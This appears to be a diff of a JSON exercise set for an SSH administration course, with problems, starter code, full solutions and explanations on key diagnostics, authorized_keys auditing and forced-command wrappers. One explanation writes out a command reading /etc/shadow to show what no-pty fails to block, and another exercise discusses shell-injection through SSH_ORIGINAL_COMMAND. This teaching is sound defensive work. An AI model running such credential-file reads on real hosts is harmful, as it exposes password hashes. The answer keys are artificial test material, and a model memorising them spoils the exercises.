+          "explanation": "A private key was passed and ssh-keygen -lf read it fine, since the fingerprint is of the public half contained inside. Line 4 matches what sshd would report on a successful login."
+        },
+        {
+          "input": "./key-installed.sh ~/.ssh/id_laptop.pub cuong@may",
+          "output": "NOT-INSTALLED SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8\npresent: SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0 backup-puller",
+          "explanation": "Eliminates three of the four causes in one command: the file is readable and holds a different key, so permissions and server config are not the issue — this key was never installed for this user."
+        },
+        {
+          "input": "./key-installed.sh ~/.ssh/id_backup cuong@may   # ~/.ssh/authorized_keys absent",
+          "output": "NO-REMOTE-FILE",
+          "explanation": "Distinct from NOT-INSTALLED: there is no file at all, which usually means the key was installed into a different user's home directory. Exit 5."
+        }
+      ],
+      "hintsJson": [
+        "`ssh-keygen -lf` works on a private key, a public key and a single authorized_keys line alike, because all of them contain or are the public key. That is why the caller does not have to say which kind was passed.",
+        "Read the remote file with `ssh \"$HOST\" 'cat ~/.ssh/authorized_keys 2>/dev/null'` and check for empty output to detect the missing-file case. Do not pass -i with the key under test.",
+        "Fingerprint each remote line the same way as the previous exercise: write it to a temp file and run ssh-keygen -lf on that. Strip any leading options first by cutting from the first ssh-/ecdsa-/sk- field.",
+        "Keep the line counter aligned with the original file by incrementing it for every line read, including blanks and comments, so the reported number matches sshd's log."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "key-installed.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Khoa cua toi CO nam trong authorized_keys tren may do khong?\n# Loai bo cau hoi re nhat truoc khi di dao quyen file va SELinux.\nset -uo pipefail\n\nKEYFILE=${1:?usage: key-installed.sh KEYFILE HOST}\nHOST=${2:?usage: key-installed.sh KEYFILE HOST}\n\n# TODO 1: lay dau van tay cua KEYFILE o may minh.\n#         ssh-keygen -lf doc duoc CA khoa rieng lan khoa cong khai —\n#         nen khong can hoi nguoi dung dua loai nao.\n\n# TODO 2: doc authorized_keys tren may xa.\n#         KHONG duoc dung -i \"$KEYFILE\" — chan doan mot cai khoa hong\n#         bang cach bat no phai hoat dong la lap luan vong tron.\n#         Rong/khong doc duoc -> NO-REMOTE-FILE, thoat 5.\n\n# TODO 3: bam dau van tay TUNG DONG (nho cat bo phan tuy chon dau dong),\n#         giu so dong dung nhu trong file goc.\n\n# TODO 4: khop -> INSTALLED ... at line N, thoat 0.\n#         khong khop -> NOT-INSTALLED + liet ke cac khoa DANG co, thoat 4.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "key-installed.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Khoa cua toi CO nam trong authorized_keys tren may do khong?\n# Loai bo cau hoi re nhat truoc khi di dao quyen file va SELinux.\nset -uo pipefail\n\nKEYFILE=${1:?usage: key-installed.sh KEYFILE HOST}\nHOST=${2:?usage: key-installed.sh KEYFILE HOST}\n[ -r \"$KEYFILE\" ] || { echo \"khong doc duoc $KEYFILE\" >&2; exit 1; }\n\ntmp=$(mktemp)\ncleanup() { rm -f \"$tmp\" 2>/dev/null; return 0; }\ntrap cleanup EXIT\n\n# 1) Dau van tay o may minh. ssh-keygen -lf doc duoc ca hai loai file,\n#    vi dau van tay la bam cua khoa CONG KHAI, ma khoa cong khai nam\n#    san ben trong khoa rieng.\nMINE=$(ssh-keygen -lf \"$KEYFILE\" 2>/dev/null | awk '{print $2}')\n[ -n \"$MINE\" ] || { echo \"khong doc duoc khoa tu $KEYFILE\" >&2; exit 1; }\n\n# 2) Doc file o may xa. KHONG dung -i \"$KEYFILE\": neu cai khoa do dang\n#    hong thi ta se khong ket noi duoc de ma di tim hieu vi sao no hong.\nremote=$(ssh -o ConnectTimeout=10 \"$HOST\" 'cat ~/.ssh/authorized_keys 2>/dev/null')\nif [ -z \"$remote\" ]; then\n  echo \"NO-REMOTE-FILE\"\n  exit 5\nfi\n\n# 3) Bam tung dong.\nn=0\npresent=()\nwhile IFS= read -r line || [ -n \"$line\" ]; do\n  n=$((n + 1))                        # dem CA dong trong lan chu thich\n  [ -z \"${line// /}\" ] && continue\n  case \"${line#\"${line%%[! ]*}\"}\" in \\#*) continue ;; esac\n\n  # Cat bo phan tuy chon dau dong (restrict, command=\"...\" ...)\n  idx=0; keyidx=0\n  for field in $line; do\n    idx=$((idx + 1))\n    case \"$field\" in ssh-*|ecdsa-*|sk-*) keyidx=$idx; break ;; esac\n  done\n  [ \"$keyidx\" -eq 0 ] && continue\n\n  keypart=$(printf '%s\\n' \"$line\" | cut -d' ' -f\"$keyidx\"-)\n  printf '%s\\n' \"$keypart\" > \"$tmp\"\n  info=$(ssh-keygen -lf \"$tmp\" 2>/dev/null) || continue\n  fp=$(printf '%s\\n' \"$info\" | awk '{print $2}')\n  comment=$(printf '%s\\n' \"$keypart\" | cut -d' ' -f3-)\n  [ -z \"$comment\" ] && comment='(no-comment)'\n\n  if [ \"$fp\" = \"$MINE\" ]; then\n    echo \"INSTALLED $MINE at line $n\"\n    exit 0\n  fi\n  present+=(\"$fp $comment\")\ndone <<EOF\n$remote\nEOF\n\n# 4) Khong khop. Liet ke nhung gi DANG co — bien mot ngo cut thanh manh moi.\n#    Rat hay gap: khoa duoc cai dung, nhung cho NGUOI DUNG KHAC.\necho \"NOT-INSTALLED $MINE\"\nfor p in ${present[@]+\"${present[@]}\"}; do\n  echo \"present: $p\"\ndone\nexit 4\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p><strong>Not using the key under test is the design constraint that matters.</strong> The obvious implementation passes <code>-i \"$KEYFILE\"</code> to read the remote file — and then the tool cannot run in exactly the situation it was built for, because the key is refused. Diagnosis has to be able to proceed through a channel that does not depend on the thing being diagnosed. Here that means connecting however the caller normally can: a password, a different key, or an already-working agent identity.</p><p><strong>One command eliminates three of the four causes.</strong> If the remote file is readable and contains keys, then sshd could read it too, the account exists, and the home directory is reachable. A <code>NOT-INSTALLED</code> verdict therefore rules out permissions, SELinux labels and server configuration in a single step, and points at the one remaining explanation. That is a large amount of diagnostic value from a string comparison, and it is available only because the same fingerprint can be computed from three different representations of the key.</p><p><strong>Listing what <em>is</em> present converts a negative result into a lead.</strong> The most common real cause of a genuinely absent key is installing it into the wrong user's home directory — <code>/root/.ssh/authorized_keys</code> while connecting as <code>cuong</code>. Seeing an unfamiliar set of comments under <code>present:</code> is usually enough to recognise that immediately, whereas a bare &quot;not found&quot; sends people to check permissions they have no reason to suspect.</p><p>Two portability notes. The remote content is fed to the loop through a heredoc rather than a pipe, so the <code>while</code> body runs in the current shell and the <code>present</code> array survives — piping into <code>while</code> puts the loop in a subshell and every accumulated value is discarded at the end. And <code>${present[@]+\"${present[@]}\"}</code> guards the expansion of a possibly-empty array under <code>set -u</code> in bash 3.2, which is what macOS still ships.</p>",
+      "referenceUrl": "https://man.openbsd.org/ssh-keygen.1"
+    },
+    {
+      "title": "Passphrase-Protected or Never Installed? Same Message, Different Cure",
+      "difficulty": "MEDIUM",
+      "estimatedMinutes": 35,
+      "points": 20,
+      "concepts": [
+        "BatchMode failure modes",
+        "detecting an encrypted private key",
+        "ssh-agent contents",
+        "symptom disambiguation"
+      ],
+      "prerequisites": [
+        "passphrases and ssh-agent",
+        "authorized_keys"
+      ],
+      "tags": [
+        "ssh",
+        "keys",
+        "ci",
+        "diagnostics"
+      ],
+      "problemHtml": "<p>A CI job fails with <code>Permission denied (publickey,password)</code>. So does a laptop whose key was never installed. So does a key that is installed correctly but sits behind a passphrase that nothing can type. One message, three states, three different fixes — and the message is the same because sshd deliberately refuses to explain which one applies.</p><p>Two of those three are decidable locally, without touching the server at all, and doing so first saves you from investigating a server that has nothing wrong with it.</p><p>Write <code>key-doctor.sh KEYFILE [HOST]</code>:</p><ul><li><strong>Check 1 — does the file parse as a private key?</strong> If not, print <code>BAD-KEY-FILE</code> and exit <code>1</code>. A truncated or line-wrapped key (pasted through a chat client, stored in a CI secret with mangled newlines) lands here.</li><li><strong>Check 2 — is it passphrase-protected?</strong> Print <code>ENCRYPTED</code> or <code>PLAINTEXT</code>. Determine it without prompting the user for anything.</li><li><strong>Check 3 — is it loaded into the agent?</strong> Print <code>IN-AGENT yes</code> or <code>IN-AGENT no</code>, comparing by fingerprint. An encrypted key that is loaded in the agent works fine in scripts; an encrypted key that is not cannot work at all.</li><li><strong>Check 4 — verdict.</strong> Print <code>USABLE-NON-INTERACTIVE yes</code> when the key is either plaintext or present in the agent, otherwise <code>no</code>.</li><li>If <code>HOST</code> was given and the key is usable non-interactively, attempt a real key-only login and print <code>LOGIN ok</code> or <code>LOGIN refused</code>. Skip this when the key is unusable — the result would be meaningless.</li><li>Exit <code>0</code> when the key is usable non-interactively, <code>2</code> when it is not.</li></ul><p>The point is the ordering: three local checks that need no network, then one remote check that is only meaningful if the local ones passed.</p>",
+      "inputSpec": "argv[1] is a path to a private key file. argv[2] is an optional SSH destination for the live login test.",
+      "outputSpec": "'BAD-KEY-FILE' (exit 1), or four lines — 'ENCRYPTED|PLAINTEXT', 'IN-AGENT yes|no', 'USABLE-NON-INTERACTIVE yes|no', and optionally 'LOGIN ok|refused' — with exit 0 when usable and 2 when not.",
+      "constraints": "Never prompt for a passphrase; every check must be non-interactive. Do not read the key file's contents looking for the string 'ENCRYPTED' — the modern OPENSSH format does not mark encryption in a way that grep can see. The live login must use BatchMode=yes, PreferredAuthentications=publickey and IdentitiesOnly=yes.",
+      "examplesJson": [
+        {
+          "input": "./key-doctor.sh ~/.ssh/id_backup cuong@may",
+          "output": "PLAINTEXT\nIN-AGENT no\nUSABLE-NON-INTERACTIVE yes\nLOGIN ok",
+          "explanation": "An automation key with no passphrase. It needs no agent, works in CI, and the live test confirms the server accepts it. Exit 0."
+        },
+        {
+          "input": "./key-doctor.sh ~/.ssh/id_laptop",
+          "output": "ENCRYPTED\nIN-AGENT no\nUSABLE-NON-INTERACTIVE no",
+          "explanation": "Reproduced with a key generated using -N 'matkhaubaove'. Under BatchMode this key produces exactly the same 'Permission denied (publickey,password)' as a key that was never installed — and no amount of work on the server would fix it. Exit 2, and the remote test is skipped because it could only mislead."
+        },
+        {
+          "input": "./key-doctor.sh ~/.ssh/id_laptop cuong@may   # after ssh-add",
+          "output": "ENCRYPTED\nIN-AGENT yes\nUSABLE-NON-INTERACTIVE yes\nLOGIN ok",
+          "explanation": "Same encrypted key, now unlocked in the agent. The agent signs on its behalf, so scripts work without the passphrase ever being typed again this session."
+        }
+      ],
+      "hintsJson": [
+        "`ssh-keygen -y -f KEY -P ''` tries to read the private key with an empty passphrase. Success means plaintext; failure means either encrypted or malformed — distinguish them with `ssh-keygen -lf`, which reads the public half and succeeds for any well-formed key.",
+        "Add `< /dev/null` to the ssh-keygen calls so that a version which decides to prompt gets EOF instead of blocking your script forever.",
+        "Get the key's fingerprint with `ssh-keygen -lf`, list the agent with `ssh-add -l`, and compare field 2 of each. `ssh-add -l` exits 1 when the agent is empty and 2 when no agent is reachable — treat both as 'not loaded' rather than as errors.",
+        "Order the checks local-first. Running the remote login test for an unusable key produces a 'refused' that says nothing about the server, which is precisely the confusion this tool exists to prevent."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "key-doctor.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Ba trang thai khac nhau, MOT thong bao loi giong het nhau.\n# Hai trong ba quyet dinh duoc NGAY TAI MAY MINH, khong can mang.\nset -uo pipefail\n\nKEYFILE=${1:?usage: key-doctor.sh KEYFILE [HOST]}\nHOST=${2:-}\n\n# TODO 1: file co phai khoa rieng hop le khong?\n#         Hong -> BAD-KEY-FILE, thoat 1.\n\n# TODO 2: co mat khau bao ve khong?\n#         Goi y: thu doc no voi mat khau RONG (-P '').\n#         TUYET DOI khong duoc hoi nguoi dung — them < /dev/null.\n\n# TODO 3: agent co dang giu khoa nay khong? So bang DAU VAN TAY.\n\n# TODO 4: ket luan. Chi khi dung duoc phi-tuong-tac VA co HOST\n#         thi moi thu dang nhap that.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "key-doctor.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Ba trang thai khac nhau, MOT thong bao loi giong het nhau.\n# Hai trong ba quyet dinh duoc NGAY TAI MAY MINH, khong can mang.\nset -uo pipefail\n\nKEYFILE=${1:?usage: key-doctor.sh KEYFILE [HOST]}\nHOST=${2:-}\n[ -r \"$KEYFILE\" ] || { echo \"BAD-KEY-FILE\"; exit 1; }\n\n# ── 1) File co doc duoc nhu mot khoa khong? ─────────────────────────\n# ssh-keygen -lf doc NUA CONG KHAI, nen no thanh cong voi moi khoa dung\n# dinh dang — ke ca khoa dang ma hoa. Hong o day = file that su hong\n# (bi cat cut, bi be dong khi di qua chat, bi hong newline trong CI secret).\nFP=$(ssh-keygen -lf \"$KEYFILE\" 2>/dev/null < /dev/null | awk '{print $2}')\nif [ -z \"$FP\" ]; then\n  echo \"BAD-KEY-FILE\"\n  exit 1\nfi\n\n# ── 2) Co mat khau bao ve khong? ────────────────────────────────────\n# Thu doc NUA RIENG voi mat khau RONG. Doc duoc = khong ma hoa.\n# KHONG duoc grep chu \"ENCRYPTED\" trong file: dinh dang OPENSSH moi\n# khong danh dau kieu do — chi dinh dang PEM cu moi co.\n# < /dev/null: neu phien ban nao do van doi hoi thi no nhan EOF chu\n# khong treo script cho ai go phim.\nif ssh-keygen -y -f \"$KEYFILE\" -P '' >/dev/null 2>&1 < /dev/null; then\n  echo \"PLAINTEXT\"\n  encrypted=0\nelse\n  echo \"ENCRYPTED\"\n  encrypted=1\nfi\n\n# ── 3) Agent co dang giu no khong? ──────────────────────────────────\n# ssh-add -l thoat 1 khi agent rong, 2 khi khong co agent nao.\n# Ca hai deu la \"khong duoc nap\", khong phai loi cua ta.\nin_agent=0\nif agent_list=$(ssh-add -l 2>/dev/null); then\n  case \"$agent_list\" in *\"$FP\"*) in_agent=1 ;; esac\nfi\n[ \"$in_agent\" -eq 1 ] && echo \"IN-AGENT yes\" || echo \"IN-AGENT no\"\n\n# ── 4) Ket luan ─────────────────────────────────────────────────────\n# Dung duoc trong script khi: khong ma hoa, HOAC da nap vao agent.\nif [ \"$encrypted\" -eq 0 ] || [ \"$in_agent\" -eq 1 ]; then\n  usable=1; echo \"USABLE-NON-INTERACTIVE yes\"\nelse\n  usable=0; echo \"USABLE-NON-INTERACTIVE no\"\nfi\n\n# Chi thu dang nhap that khi phep thu do CO Y NGHIA. Chay no voi mot cai\n# khoa khong dung duoc se ra \"refused\" — va cau tra loi do khong noi gi\n# ve may chu ca, dung la thu nham lan ma cong cu nay sinh ra de tranh.\nif [ -n \"$HOST\" ] && [ \"$usable\" -eq 1 ]; then\n  if ssh -o BatchMode=yes \\\n         -o PreferredAuthentications=publickey \\\n         -o IdentitiesOnly=yes \\\n         -o ConnectTimeout=10 \\\n         -i \"$KEYFILE\" \"$HOST\" true 2>/dev/null; then\n    echo \"LOGIN ok\"\n  else\n    echo \"LOGIN refused\"\n  fi\nfi\n\n[ \"$usable\" -eq 1 ] && exit 0\nexit 2\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p><strong>Detecting encryption without prompting.</strong> The instinct is <code>grep ENCRYPTED keyfile</code>, which worked for the old PEM format where a header literally said <code>Proc-Type: 4,ENCRYPTED</code>. The modern <code>OPENSSH PRIVATE KEY</code> container does not expose that: the whole body is base64 and the cipher name is inside it. The reliable test is behavioural — ask <code>ssh-keygen -y</code> to read the private half with an <em>empty</em> passphrase (<code>-P ''</code>) and see whether it succeeds. That distinguishes plaintext from encrypted using the same code path SSH itself would take.</p><p><strong>Why <code>-lf</code> and <code>-y</code> give different answers, and why both are needed.</strong> <code>-lf</code> reads only the public half, which is stored unencrypted even in a passphrase-protected file, so it succeeds for any well-formed key. <code>-y</code> must decrypt the private half. A file where <code>-lf</code> succeeds and <code>-y -P ''</code> fails is encrypted; a file where <em>both</em> fail is corrupt. Testing them in that order is what separates <code>ENCRYPTED</code> from <code>BAD-KEY-FILE</code>, and those two have nothing in common as problems.</p><p><strong><code>&lt; /dev/null</code> on every check.</strong> A tool that might prompt will block forever inside CI, and the job dies at the runner's global timeout with no useful log. Redirecting stdin from <code>/dev/null</code> converts any prompt into an immediate EOF and therefore into a clean failure your code can classify. This is the same discipline as <code>BatchMode=yes</code> for <code>ssh</code>, applied to the key tools.</p><p><strong>Skipping the remote test when the key is unusable</strong> is the ordering decision that gives the tool its value. An encrypted key with no agent will be refused by every server on earth; printing <code>LOGIN refused</code> in that case invites someone to go and inspect <code>authorized_keys</code>, file permissions and SELinux on a machine that is behaving perfectly. Three local checks, costing no network at all, decide whether the remote question is even worth asking.</p>",
+      "diagramMermaid": "flowchart TD\n  A[File khoa] --> B{ssh-keygen -lf doc duoc khong}\n  B -->|Khong| C[BAD-KEY-FILE thoat 1]\n  B -->|Duoc| D{Doc duoc nua rieng voi mat khau rong khong}\n  D -->|Duoc| E[PLAINTEXT]\n  D -->|Khong| F[ENCRYPTED]\n  E --> G[Dung duoc phi tuong tac]\n  F --> H{Agent co giu khoa nay khong}\n  H -->|Co| G\n  H -->|Khong| I[Khong dung duoc trong script thoat 2]\n  G --> J[Chi luc nay moi thu dang nhap that]",
+      "referenceUrl": "https://man.openbsd.org/ssh-add.1"
+    },
+    {
+      "title": "Audit Which Keys Are Unrestricted",
+      "difficulty": "MEDIUM",
+      "estimatedMinutes": 45,
+      "points": 20,
+      "concepts": [
+        "key options",
+        "least privilege",
+        "risk classification",
+        "auditing across accounts"
+      ],
+      "prerequisites": [
+        "authorized_keys options",
+        "parsing key lines"
+      ],
+      "tags": [
+        "ssh",
+        "security",
+        "audit",
+        "bash"
+      ],
+      "problemHtml": "<p>Every line in <code>authorized_keys</code> grants a full interactive shell unless it says otherwise. That default is right for a person and wrong for everything else: a backup key, a monitoring key or a CI deploy key needs one command, and giving it a shell means a leaked key is a shell rather than a database dump.</p><p>Write <code>audit-keys.sh FILE</code> that classifies each key by how much it grants and produces a report you could act on.</p><ul><li><code>OPEN</code> — no options at all. Full shell, all forwarding, everything.</li><li><code>PARTIAL</code> — some options, but neither <code>restrict</code> nor <code>command=</code>. Something was tightened; the key can still open a shell.</li><li><code>COMMAND</code> — has <code>command=</code>. Limited to one command.</li><li><code>LOCKED</code> — has <code>restrict</code> <strong>and</strong> <code>command=</code>. The strongest common shape.</li><li>Print one line per key: <code>&lt;class&gt; line &lt;n&gt; &lt;comment&gt;</code>.</li><li>Then a summary: <code>summary: &lt;o&gt; open, &lt;p&gt; partial, &lt;c&gt; command, &lt;l&gt; locked</code>.</li><li>Exit <code>1</code> if any key is <code>OPEN</code> and its comment looks automated — containing any of <code>ci</code>, <code>deploy</code>, <code>backup</code>, <code>bot</code>, <code>runner</code> as a substring, case-insensitively. A human's laptop key being OPEN is normal; a key called <code>backup-puller</code> being OPEN is a finding.</li></ul><p>That last rule is what makes the tool usable. An audit that flags every unrestricted key produces a list nobody acts on, because most unrestricted keys are people and are supposed to be. Flagging only the keys whose own comment says they belong to a machine yields a short list that is nearly always genuine.</p>",
+      "inputSpec": "argv[1] is a path to an authorized_keys-format file. Options may appear before the key type and may contain quoted strings with spaces and commas.",
+      "outputSpec": "One '<class> line <n> <comment>' per key, then 'summary: <o> open, <p> partial, <c> command, <l> locked'. Exit 1 if any automated-looking key is OPEN, else 0.",
+      "constraints": "The class must be decided from the options string only. Do not match 'command=' inside the base64 blob or inside a comment. Comment matching for the automation heuristic is case-insensitive substring matching. Line numbers must match the original file.",
+      "examplesJson": [
+        {
+          "input": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGw2pKaViomw2P5pxizI9DoBKD7YTkI//q1xtri0SJCW cuong@macbook\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+u9XMbezKRGiitbMkt5hWXGZHCIc6Wmu3NIJYkoWM+ backup-puller",
+          "output": "OPEN line 1 cuong@macbook\nOPEN line 2 backup-puller\nsummary: 2 open, 0 partial, 0 command, 0 locked",
+          "explanation": "Exit 1. The first key is a person and unrestricted is expected; the second calls itself backup-puller and has a full shell, which is the finding worth acting on."
+        },
+        {
+          "input": "restrict,command=\"/usr/local/bin/backup-only.sh\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+u9XMbezKRGiitbMkt5hWXGZHCIc6Wmu3NIJYkoWM+ backup-puller\nno-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGw2pKaViomw2P5pxizI9DoBKD7YTkI//q1xtri0SJCW ci-runner",
+          "output": "LOCKED line 1 backup-puller\nPARTIAL line 2 ci-runner\nsummary: 0 open, 1 partial, 0 command, 1 locked",
+          "explanation": "Exit 0 — no automated key is fully OPEN. Note that ci-runner is only PARTIAL: no-pty blocks an interactive terminal but still allows 'ssh host <any command>', which people routinely mistake for a real restriction."
+        },
+        {
+          "input": "command=\"/usr/bin/rrsync ~/backups\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGw2pKaViomw2P5pxizI9DoBKD7YTkI//q1xtri0SJCW rsync-only",
+          "output": "COMMAND line 1 rsync-only\nsummary: 0 open, 0 partial, 1 command, 0 locked",
+          "explanation": "A forced command without restrict. The command is constrained but port forwarding is still permitted, so the key can still be used to open a tunnel into the network. Exit 0, though LOCKED would be the better configuration."
+        }
+      ],
+      "hintsJson": [
+        "Find the key boundary first, exactly as in the earlier exercise: the first field starting with ssh-, ecdsa- or sk-. Everything before it is the options string; everything after is key and comment.",
+        "Classify from the options substring only. Searching the whole line for 'command=' can match text inside a comment, and searching for 'restrict' can match a comment like 'restricted-laptop'.",
+        "Lower-case the comment for the automation test. In bash 3.2 there is no ${var,,}, so use `tr '[:upper:]' '[:lower:]'`.",
+        "Keep a flag rather than exiting inside the loop, so the summary line always prints. A tool that exits early on the first finding hides the rest of the report."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "audit-keys.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Moi dong khong co tuy chon la cap MOT SHELL DAY DU. Xem cai nao dang the.\nset -uo pipefail\n\nFILE=${1:?usage: audit-keys.sh FILE}\n[ -r \"$FILE\" ] || { echo \"NO-FILE\"; exit 1; }\n\nopen=0; partial=0; cmd=0; locked=0; finding=0\n\n# TODO 1: voi moi dong khoa, tach PHAN TUY CHON (truoc loai khoa).\n\n# TODO 2: phan loai CHI dua vao phan tuy chon do:\n#         rong                          -> OPEN\n#         co ca restrict va command=    -> LOCKED\n#         co command=                   -> COMMAND\n#         con lai                       -> PARTIAL\n\n# TODO 3: OPEN + chu thich trong nhu cua may (ci/deploy/backup/bot/runner)\n#         -> danh dau finding. Dung thoat ngay: con phai in het bao cao.\n\n# TODO 4: in dong summary, roi thoat 1 neu co finding.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "audit-keys.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Moi dong khong co tuy chon la cap MOT SHELL DAY DU. Xem cai nao dang the.\nset -uo pipefail\n\nFILE=${1:?usage: audit-keys.sh FILE}\n[ -r \"$FILE\" ] || { echo \"NO-FILE\"; exit 1; }\n\nopen=0; partial=0; cmd=0; locked=0; finding=0\nn=0\n\nwhile IFS= read -r line || [ -n \"$line\" ]; do\n  n=$((n + 1))\n  [ -z \"${line// /}\" ] && continue\n  case \"${line#\"${line%%[! ]*}\"}\" in \\#*) continue ;; esac\n\n  # Ranh gioi: truong dau tien la LOAI KHOA.\n  idx=0; keyidx=0\n  for field in $line; do\n    idx=$((idx + 1))\n    case \"$field\" in ssh-*|ecdsa-*|sk-*) keyidx=$idx; break ;; esac\n  done\n  [ \"$keyidx\" -eq 0 ] && continue\n\n  # Phan tuy chon = moi thu TRUOC loai khoa. Phan loai chi duoc nhin vao\n  # day. Tim \"command=\" tren CA DONG se khop nham voi mot chu thich\n  # kieu \"laptop-command-center\", con \"restrict\" khop nham voi\n  # \"restricted-laptop\" — hai lan bao sai lien tiep.\n  if [ \"$keyidx\" -gt 1 ]; then\n    opts=$(printf '%s\\n' \"$line\" | cut -d' ' -f1-$((keyidx - 1)))\n  else\n    opts=\"\"\n  fi\n\n  keypart=$(printf '%s\\n' \"$line\" | cut -d' ' -f\"$keyidx\"-)\n  comment=$(printf '%s\\n' \"$keypart\" | cut -d' ' -f3-)\n  [ -z \"$comment\" ] && comment='(no-comment)'\n\n  has_cmd=0; has_restrict=0\n  case \"$opts\" in *command=*)  has_cmd=1 ;; esac\n  case \"$opts\" in *restrict*)  has_restrict=1 ;; esac\n\n  if [ -z \"${opts// /}\" ]; then\n    class=OPEN;     open=$((open + 1))\n  elif [ \"$has_cmd\" -eq 1 ] && [ \"$has_restrict\" -eq 1 ]; then\n    class=LOCKED;   locked=$((locked + 1))\n  elif [ \"$has_cmd\" -eq 1 ]; then\n    class=COMMAND;  cmd=$((cmd + 1))\n  else\n    class=PARTIAL;  partial=$((partial + 1))\n  fi\n\n  echo \"$class line $n $comment\"\n\n  # Chi bao dong voi khoa TU KHAI la cua may. Mot cai khoa laptop khong\n  # co rang buoc la binh thuong; bao dong ca no thi danh sach dai toi muc\n  # khong ai xu ly, va the la bo sot cai that su quan trong.\n  if [ \"$class\" = \"OPEN\" ]; then\n    lc=$(printf '%s\\n' \"$comment\" | tr '[:upper:]' '[:lower:]')\n    case \"$lc\" in\n      *ci*|*deploy*|*backup*|*bot*|*runner*) finding=1 ;;\n    esac\n  fi\ndone < \"$FILE\"\n\necho \"summary: $open open, $partial partial, $cmd command, $locked locked\"\n[ \"$finding\" -eq 1 ] && exit 1\nexit 0\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p><strong>Classifying from the options substring only.</strong> Searching the entire line is the obvious shortcut and it produces false positives from two directions: a comment such as <code>laptop-command-center</code> contains <code>command</code>, and <code>restricted-laptop</code> contains <code>restrict</code>. Both would upgrade a fully open key to LOCKED — an audit tool reporting that the most dangerous key is the safest one. Cutting the line at the key-type boundary and examining only what precedes it removes the possibility entirely.</p><p><strong>PARTIAL exists as a class because <code>no-pty</code> is widely mistaken for a real restriction.</strong> It blocks an interactive terminal, and that is all: <code>ssh host 'cat /etc/shadow'</code> still runs, because running a command needs no pty (Module 1). A key marked <code>no-pty</code> feels locked down and grants arbitrary command execution. Giving it a class of its own, distinct from both OPEN and COMMAND, is what makes the report say something true.</p><p><strong>The automation heuristic is what makes the exit status usable as a gate.</strong> Flagging every unrestricted key produces a list dominated by people's laptops, which are supposed to be unrestricted — and a report that is mostly noise gets ignored, at which point it fails to surface the one line that matters. Restricting the finding to keys whose own comment identifies them as machinery gives a short list that is almost always actionable. It is a heuristic and it can miss a badly-named key; the honest framing is that it catches the common case cheaply rather than that it is complete.</p><p>Two implementation details worth keeping. The <code>finding</code> flag is set rather than exiting inside the loop, so the full report and the summary always print — a gate that truncates its own output makes the failure harder to fix than it needs to be. And <code>tr '[:upper:]' '[:lower:]'</code> is used instead of <code>${comment,,}</code> because the latter is bash 4 syntax and macOS ships bash 3.2, where it is a syntax error rather than a graceful degradation.</p>",
+      "referenceUrl": "https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT"
+    },
+    {
+      "title": "Write a Forced Command That Cannot Be Talked Out Of It",
+      "difficulty": "MEDIUM",
+      "estimatedMinutes": 50,
+      "points": 20,
+      "concepts": [
+        "forced commands",
+        "SSH_ORIGINAL_COMMAND",
+        "allowlists",
+        "argument injection"
+      ],
+      "prerequisites": [
+        "key options",
+        "shell quoting"
+      ],
+      "tags": [
+        "ssh",
+        "security",
+        "automation",
+        "bash"
+      ],
+      "problemHtml": "<p>A <code>command=</code> entry in <code>authorized_keys</code> replaces whatever the client asked for. The client's request is not discarded, though — it is handed to your script in <code>$SSH_ORIGINAL_COMMAND</code>, and the moment you use that variable you have re-opened the door you just closed.</p><p>This is where most forced-command wrappers go wrong. Passing the variable to a shell, or interpolating it into a command line, gives the client arbitrary execution through a key that was supposed to allow one operation.</p><p>Write <code>backup-only.sh</code>, the target of a <code>command=</code> entry, supporting exactly three operations chosen by an <strong>allowlist</strong>.</p><ul><li><code>dump</code> — run <code>docker exec cuonghoangdev_postgres pg_dump -U postgres cuonghoangdev_db</code> and stream it to stdout.</li><li><code>list</code> — print the names of files in <code>/opt/backups</code>, one per line.</li><li><code>status</code> — print <code>ok</code> and the current UTC date.</li><li>Anything else, including an empty request: print <code>DENIED: &lt;what was requested&gt;</code> to stderr and exit <code>77</code>.</li><li>The requested string must be compared against the three literals with an exact match. Never pass it to <code>eval</code>, never expand it unquoted, and never build a command line by concatenation.</li><li>Log every request — accepted or denied — to <code>/var/log/backup-key.log</code> as <code>&lt;iso-date&gt; &lt;client-ip&gt; &lt;verdict&gt; &lt;request&gt;</code>, taking the client address from <code>$SSH_CONNECTION</code>.</li></ul><p>Then show, as a comment block at the top of the file, the exact <code>authorized_keys</code> line that installs it — including <code>restrict</code>, because a forced command alone still permits port forwarding, and a key that can open tunnels into your network is not restricted in any meaningful sense.</p>",
+      "inputSpec": "The environment variable SSH_ORIGINAL_COMMAND holds whatever the client asked to run; it may be empty, may contain spaces, quotes, semicolons and shell metacharacters, and is entirely attacker-controlled. SSH_CONNECTION holds 'client-ip client-port server-ip server-port'.",
+      "outputSpec": "For an allowed verb, that operation's output on stdout and exit 0. Otherwise 'DENIED: <request>' on stderr and exit 77. One log line per invocation either way.",
+      "constraints": "No eval, no `sh -c \"$SSH_ORIGINAL_COMMAND\"`, no unquoted expansion of the variable, and no building commands by string concatenation. Comparison must be exact equality against the three literals — prefix or substring matching is not acceptable.",
+      "examplesJson": [
+        {
+          "input": "ssh -i ~/.ssh/id_backup root@160.187.1.208 status",
